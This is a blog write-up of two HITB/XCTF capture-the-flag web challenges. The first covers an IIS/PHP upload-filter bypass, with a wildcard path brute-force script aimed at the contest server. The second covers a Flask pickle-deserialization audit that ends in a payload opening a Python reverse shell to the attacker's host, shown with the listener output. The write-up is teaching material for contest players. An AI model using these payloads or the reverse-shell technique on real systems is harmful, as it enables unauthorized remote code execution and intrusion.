---
title: XCTF-HIBTweb writeup
url: 296.html
id: 296
categories:
  - CTF
date: 2018-04-14 18:01:06
tags:
---

# upload

两个主要功能页面

*   index.html   上传图片 上传之后会返回图片重命名后的名字
*   pic.php?filename=xxx.png    返回图片的长、宽

还有一个很重要的信息，IIS+php ![](http://blog.kingkk.com/wp-content/uploads/2018/04/6af0e9dc49da3c967c81e97aa29148eb.png) 先试着上传一个php文件 ![](http://blog.kingkk.com/wp-content/uploads/2018/04/065f21cdfbff65ec89c609d10cae2b8c.png) 发现做了过滤，可以用一个简单的方法绕过 文件名后加一个空格，windows下会自动去掉 `1.php` （后面有一个空格） ![](http://blog.kingkk.com/wp-content/uploads/2018/04/c7c0e8b93e16db6b3d32944e26f7c1c8.png) 上传成功 ![](http://blog.kingkk.com/wp-content/uploads/2018/04/954b95edcd1c8626004ab2ede26c899a.png) 接下来就是找文件被放到了哪里（自己比赛的时候一直是以为上传完之后文件就被删了，要去upload下竞速找文件。。） 这里应该首先想到windows平台下php文件解析的一个bug 主要是由于php使用了windows提供的一个`FindFirstFileExW()`系统api 在判断文件路径时，有如下特性
```
大于号(>)相等于通配符问号(?) 
小于号(<)相当于通配符星号(*) 
双引号(")相当于点字符(.)
```
详细文章可看如下链接

http://www.freebuf.com/column/164698.html

php中的`getimagesize()`函数恰好在识别文件路径时调用了`FindFirstFileExW()`底层函数 这样就可以顺利的将突破点放在pic.php文件中，利用如下payload
```
http://47.90.97.18:9999/pic.php?filename=../8</1523519201.jpg
```
前缀正确时会返回图片信息，否则error 接下来就可以写脚本爆破了
```python
    #encoding=utf8
    import requests, string
    
    str_rang = string.ascii_letters+string.digits
    base_url = "http://47.90.97.18:9999/pic.php?filename=../{}{}</1523458638.png"
    img_dir = ''
    
    for k in range(40):
    	for i in str_rang:
    		url = base_url.format(img_dir, i)
    		r = requests.get(url)
    		if r.text != "image error":
    			img_dir+=i
    			print(img_dir)
    			break
```
路径如下

87194f13726af7cee27ba2cfe97b60df

访问一下可以直接执行，接下来就可以上菜刀拿flag了  



# Python's revenge

一个代码审计，先上代码（据说和强网杯题目类似，可惜那时根本没看这题目，如今好好研究下）
```python
from __future__ import unicode_literals
from flask import Flask, request, make_response, redirect, url_for, session
from flask import render_template, flash, redirect, url_for, request
from werkzeug.security import safe_str_cmp
from base64 import b64decode as b64d
from base64 import b64encode as b64e
from hashlib import sha256
from cStringIO import StringIO
import random
import string

import os
import sys
import subprocess
import commands
import pickle
import cPickle
import marshal
import os.path
import filecmp
import glob
import linecache
import shutil
import dircache
import io
import timeit
import popen2
import code
import codeop
import pty
import posixfile

SECRET_KEY = 'you will never guess'

if not os.path.exists('.secret'):
    with open(".secret", "w") as f:
        secret = ''.join(random.choice(string.ascii_letters + string.digits)
                         for x in range(4))
        f.write(secret)
with open(".secret", "r") as f:
    cookie_secret = f.read().strip()

app = Flask(__name__)
app.config.from_object(__name__)

black_type_list = [eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen]


@app.before_request
def count():
    session['cnt'] = 0


@app.route('/')
def home():
    remembered_str = 'Hello, here\'s what we remember for you. And you can change, delete or extend it.'
    new_str = 'Hello fellow zombie, have you found a tasty brain and want to remember where? Go right here and enter it:'
    location = getlocation()
    if location == False:
        return redirect(url_for("clear"))
    return render_template('index.html', txt=remembered_str, location=location)


@app.route('/clear')
def clear():
    flash("Reminder cleared!")
    response = redirect(url_for('home'))
    response.set_cookie('location', max_age=0)
    return response


@app.route('/reminder', methods=['POST', 'GET'])
def reminder():
    if request.method == 'POST':
        location = request.form["reminder"]
        if location == '':
            flash("Message cleared, tell us when you have found more brains.")
        else:
            flash("We will remember where you find your brains.")
        location = b64e(pickle.dumps(location))
        cookie = make_cookie(location, cookie_secret)
        response = redirect(url_for('home'))
        response.set_cookie('location', cookie)
        return response
    location = getlocation()
    if location == False:
        return redirect(url_for("clear"))
    return render_template('reminder.html')


class FilterException(Exception):
    def __init__(self, value):
        super(FilterException, self).__init__(
            'The callable object {value} is not allowed'.format(value=str(value)))


class TimesException(Exception):
    def __init__(self):
        super(TimesException, self).__init__(
            'Call func too many times!')


def _hook_call(func):
    def wrapper(*args, **kwargs):
        session['cnt'] += 1
        print session['cnt']
        print args[0].stack
        for i in args[0].stack:
            if i in black_type_list:
                raise FilterException(args[0].stack[-2])
            if session['cnt'] > 4:
                raise TimesException()
        return func(*args, **kwargs)
    return wrapper


def loads(strs):
    reload(pickle)
    files = StringIO(strs)
    unpkler = pickle.Unpickler(files)
    unpkler.dispatch[pickle.REDUCE] = _hook_call(
        unpkler.dispatch[pickle.REDUCE])
    return unpkler.load()


def getlocation():
    cookie = request.cookies.get('location')
    if not cookie:
        return ''
    (digest, location) = cookie.split("!")
    if not safe_str_cmp(calc_digest(location, cookie_secret), digest):
        flash("Hey! This is not a valid cookie! Leave me alone.")
        return False
    location = loads(b64d(location))
    return location


def make_cookie(location, secret):
    return "%s!%s" % (calc_digest(location, secret), location)


def calc_digest(location, secret):
    return sha256("%s%s" % (location, secret)).hexdigest()


if __name__ == '__main__':
    app.run(host="0.0.0.0", port=5051)
```
接下来就是阅读代码锁定漏洞可能发生的位置（实在看的头晕可以追踪black\_type\_list这个黑名单列表）
```python
    def loads(strs):
        reload(pickle)
        files = StringIO(strs)
        unpkler = pickle.Unpickler(files)
        unpkler.dispatch[pickle.REDUCE] = _hook_call(
            unpkler.dispatch[pickle.REDUCE])
        return unpkler.load()
```
主要就是这个loads函数，利用了pickle这个库，对数据进行了反序列化，导致反序列化漏洞的产生 寻找一下调用关系
```
reminder-->getlocation()-->loads()
```
其中反序列化的原始信息以base64以及哈希后的值，被保存在cookie的location中，当哈希值与base64值不相同时会重置cookie 哈希的内容中除了反序列化的base64还有一个随机数
```python
    secret = ''.join(random.choice(string.ascii_letters + string.digits) for x in range(4))
```
四位数的随机数，可以利用最初的cookie爆破一下这个随机数（4\*\*62,大概一千多万） 
最后的结果`hitb` 有了这个随机数，我们就可以生成自己的恶意cookie，绕过哈希验证了 接下来就时构造恶意函数的时候了，代码中黑名单过滤了好多函数（当时就是被卡死在这里）
```python
black_type_list = [eval, execfile, compile, open, file, os.system, os.popen, os.popen2, os.popen3, os.popen4, os.fdopen, os.tmpfile, os.fchmod, os.fchown, os.open, os.openpty, os.read, os.pipe, os.chdir, os.fchdir, os.chroot, os.chmod, os.chown, os.link, os.lchown, os.listdir, os.lstat, os.mkfifo, os.mknod, os.access, os.mkdir, os.makedirs, os.readlink, os.remove, os.removedirs, os.rename, os.renames, os.rmdir, os.tempnam, os.tmpnam, os.unlink, os.walk, os.execl, os.execle, os.execlp, os.execv, os.execve, os.dup, os.dup2, os.execvp, os.execvpe, os.fork, os.forkpty, os.kill, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe, os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe, pickle.load, pickle.loads, cPickle.load, cPickle.loads, subprocess.call, subprocess.check_call, subprocess.check_output, subprocess.Popen, commands.getstatusoutput, commands.getoutput, commands.getstatus, glob.glob, linecache.getline, shutil.copyfileobj, shutil.copyfile, shutil.copy, shutil.copy2, shutil.move, shutil.make_archive, dircache.listdir, dircache.opendir, io.open, popen2.popen2, popen2.popen3, popen2.popen4, timeit.timeit, timeit.repeat, sys.call_tracing, code.interact, code.compile_command, codeop.compile_command, pty.spawn, posixfile.open, posixfile.fileopen]
```
最后，看了下大佬用的函数（说实话我也不是很清楚干啥的，应该也是执行一些系统命令）

platform.popen

接下来构造序列化函数
```python
    import cPickle
    class genpoc(object):
    	def __reduce__(self):
    		import platform
    		return (platform.popen,("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"自己的IP\",23333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'",)) 
    
    e = genpoc()
    shell_code = cPickle.dumps(e)
    
    with open('./1.txt','wb') as f:
    	f.write(shell_code)
```
将序列话后的代码进行base64加密，然后再与hitb进行sha256哈希，构造对应的cookie 在自己的主机上`nc -nvlp 23333` 然后来到reminder页面，刷新，并替换cookie ![](http://blog.kingkk.com/wp-content/uploads/2018/04/65310fbee0c40baf385649ee2b508b95.png) 成功反向连接
```
Ncat: Version 6.40 ( http://nmap.org/ncat )
Ncat: Listening on :::23333
Ncat: Listening on 0.0.0.0:23333
Ncat: Connection from 47.75.151.118.
Ncat: Connection from 47.75.151.118:54836.
/bin/sh: 0: can't access tty; job control turned off
$
```
得到flag

$ cat flag\_is\_here
HITB{Py5h0n1st8eBe3tNOW}